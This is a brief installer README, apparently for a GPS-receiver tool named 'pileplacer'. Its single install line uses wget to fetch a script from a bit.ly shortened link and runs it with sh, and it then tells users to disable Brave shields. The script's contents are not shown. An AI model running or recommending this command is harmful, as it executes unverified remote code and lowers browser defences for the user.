# installer

Copy and paste the following line to install all the requirements

```bash
wget -qO z bit.ly/pileplacer && sh z
```

After the installation is complete, open brave and set "Brave shields down" to enable communication to the GPS receiver
